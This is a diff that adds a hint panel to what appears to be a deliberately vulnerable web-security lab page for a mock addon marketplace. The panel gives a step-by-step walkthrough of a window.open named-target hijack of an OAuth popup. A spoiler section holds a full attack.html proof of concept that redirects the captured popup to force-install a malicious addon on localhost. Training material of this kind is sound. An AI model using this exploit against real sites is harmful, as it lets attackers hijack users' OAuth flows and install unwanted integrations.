@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>WorkHub - Addon Marketplace</title>
+  <link rel="stylesheet" href="/css/hint-panel.css">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { font-family: 'Inter', -apple-system, sans-serif; background: #f1f5f9; color: #1e293b; }
@@ -235,6 +236,83 @@
           loadAddons();
         }
       }).catch(function(){});
+
+    function toggleHints() {
+      document.getElementById('hintPanel').classList.toggle('open');
+      document.getElementById('hintBackdrop').classList.toggle('show');
+    }
   </script>
+
+  <button class="stuck-btn" onclick="toggleHints()"><span class="q">💡</span> Stuck?</button>
+  <div class="hint-backdrop" id="hintBackdrop" onclick="toggleHints()"></div>
+  <div class="hint-panel" id="hintPanel">
+    <div class="hint-header">
+      <h2>Hint: WorkHub window.open Hijack</h2>
+      <button class="hint-close" onclick="toggleHints()">×</button>
+    </div>
+    <div class="hint-body">
+      <div class="hint-intro">The app uses <code>window.open(url, 'workhub-addon-oauth', ...)</code> with a fixed target name. Pre-register an iframe with that same name on your attacker page — the OAuth popup loads INSIDE your iframe.</div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">1</div><span>Find the predictable name</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Open DevTools Sources. Search for <code>window.open</code>. The second arg is a static string: <code>'workhub-addon-oauth'</code>. Per HTML spec, <code>window.open</code> reuses any existing browsing context (popup or iframe) with that name.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">2</div><span>Build the attacker page</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          On any HTML page you control, create an iframe with <code>name="workhub-addon-oauth"</code>. Since the test runs on localhost, open a second tab with a local HTML file.
+          <pre><code>&lt;iframe name="workhub-addon-oauth" src="about:blank"&gt;&lt;/iframe&gt;</code></pre>
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">3</div><span>Trigger the install flow</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Open WorkHub in one tab, click "Connect" on ANY addon and confirm install. The popup opens... inside your attacker iframe. The iframe's <code>onload</code> tells you the hijack worked.
+        </div>
+      </div>
+
+      <div class="hint-step" onclick="this.classList.toggle('open')">
+        <div class="hint-step-header">
+          <div class="hint-step-num">4</div><span>Force-install the malicious addon</span><span class="hint-step-arrow">›</span>
+        </div>
+        <div class="hint-step-content" onclick="event.stopPropagation()">
+          Instead of completing OAuth for the addon the user picked, redirect your iframe to the <code>/api/addons/callback?code=X&state=addon_malicious-addon</code> URL. The server treats the state as legit, installs the malicious addon, and posts success to the opener.
+        </div>
+      </div>
+
+      <div class="hint-spoiler">
+        <button class="hint-spoiler-btn" onclick="this.parentElement.classList.toggle('open')">🚩 Full Solution</button>
+        <div class="hint-spoiler-content">
+          <p>Create <code>attack.html</code> on your disk and open it:</p>
+          <pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;&lt;body&gt;
+&lt;h2&gt;WorkHub addon hijack PoC&lt;/h2&gt;
+&lt;button onclick="openTarget()"&gt;1. Open WorkHub&lt;/button&gt;
+&lt;iframe id="hijack" name="workhub-addon-oauth" src="about:blank" width="400" height="300"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+function openTarget() {
+  window.open('http://localhost:3000/labs/realworld/window-open-hijack.html');
+}
+document.getElementById('hijack').onload = function() {
+  if (this.src === 'about:blank') return;
+  // The OAuth popup landed in our iframe — redirect to malicious addon callback
+  this.src = 'http://localhost:3000/api/addons/callback?code=STOLEN&state=addon_malicious-addon';
+};
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</pre>
+          <p>Flow: open attack page → click "Open WorkHub" → in WorkHub click Connect on any addon → the popup loads inside your iframe → iframe onload fires → we redirect iframe to the malicious addon's callback URL → server installs "malicious-addon" → callback page's postMessage tells WorkHub it succeeded.</p>
+        </div>
+      </div>
+    </div>
+  </div>
 </body>
 </html>
